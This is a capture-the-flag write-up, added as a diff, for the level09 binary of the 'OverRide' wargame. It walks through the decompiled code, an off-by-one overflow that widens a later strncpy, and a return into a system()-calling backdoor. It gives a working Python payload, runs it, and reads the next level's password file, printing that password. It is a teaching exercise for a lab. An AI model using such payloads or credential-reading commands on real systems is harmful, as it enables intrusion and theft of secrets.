@@ -1,0 +1,111 @@
+Upon login we're greeted by the usual message. This time we have no stack canary but NX and PIE is enabled.
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
+```
+
+And when we run it, we need to enter a username and a message to send.
+
+```shell
+level09@OverRide:~$ ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: abc
+>: Welcome, abc
+>: Msg @Unix-Dude
+>>: abc
+>: Msg sent!
+```
+
+Let's take a look at the compiled code.
+
+```cpp
+int secret_backdoor()
+{
+  char s[128]; // [rsp+0h] [rbp-80h] BYREF
+
+  fgets(s, 128, stdin);
+  return system(s);
+}
+
+char *__fastcall set_msg(char *buffer)
+{
+  char s[1024]; // [rsp+10h] [rbp-400h] BYREF
+
+  memset(s, 0, sizeof(s));
+  puts(">: Msg @Unix-Dude");
+  printf(">>: ");
+  fgets(s, 1024, stdin);
+  return strncpy(buffer, s, *((int *)buffer + 45));
+}
+
+int __fastcall set_username(char *buffer)
+{
+  char s[140]; // [rsp+10h] [rbp-90h] BYREF
+  int i; // [rsp+9Ch] [rbp-4h]
+
+  memset(s, 0, 128uLL);
+  puts(">: Enter your username");
+  printf(">>: ");
+  fgets(s, 128, stdin);
+  for ( i = 0; i <= 40 && s[i]; ++i )
+    buffer[i + 140] = s[i];
+  return printf(">: Welcome, %s", buffer + 140);
+}
+
+int handle_msg()
+{
+  char buffer[140]; // [rsp+0h] [rbp-C0h] BYREF
+  __int64 v2; // [rsp+8Ch] [rbp-34h]
+  __int64 v3; // [rsp+94h] [rbp-2Ch]
+  __int64 v4; // [rsp+9Ch] [rbp-24h]
+  __int64 v5; // [rsp+A4h] [rbp-1Ch]
+  __int64 v6; // [rsp+ACh] [rbp-14h]
+  int v7; // [rsp+B4h] [rbp-Ch]
+
+  v2 = 0LL;
+  v3 = 0LL;
+  v4 = 0LL;
+  v5 = 0LL;
+  v6 = 0LL;
+  v7 = 140;
+  set_username(buffer);
+  set_msg(buffer);
+  return puts(">: Msg sent!");
+}
+
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  puts(
+    "--------------------------------------------\n"
+    "|   ~Welcome to l33t-m$n ~    v1337        |\n"
+    "--------------------------------------------");
+  handle_msg();
+  return 0;
+}
+```
+
+We can identify that there is a one byte overflow in the for loop in `set_username`. And this one byte overflow allows us to modify how much it will copy to the buffer in `set_msg`. We can modify it so it will copy a lot and overflow the buffer to return to `secret_backdoor`
+
+The maximum value for one byte is `\xFF` and using a pattern generator we can identify that the buffer overflow at index 200. Now we need to figure out what's the address of `secret_backdoor`. Fortunately even though PIE is enabled but ASLR is disabled so we can just find the address of function in `gdb`, which is `0x55555555488c`.
+
+With all of these information, we can build the payload:
+
+```shell
+level09@OverRide:~$ python -c "print 'A'*40 + '\xFF' + '\n' + 'B'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00'" > /tmp/payload
+level09@OverRide:~$ cat /tmp/payload - | ./level09
+--------------------------------------------
+|   ~Welcome to l33t-m$n ~    v1337        |
+--------------------------------------------
+>: Enter your username
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
+>>: >: Msg sent!
+/bin/sh
+whoami
+end
+cat /home/users/end/.pass
+j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+```
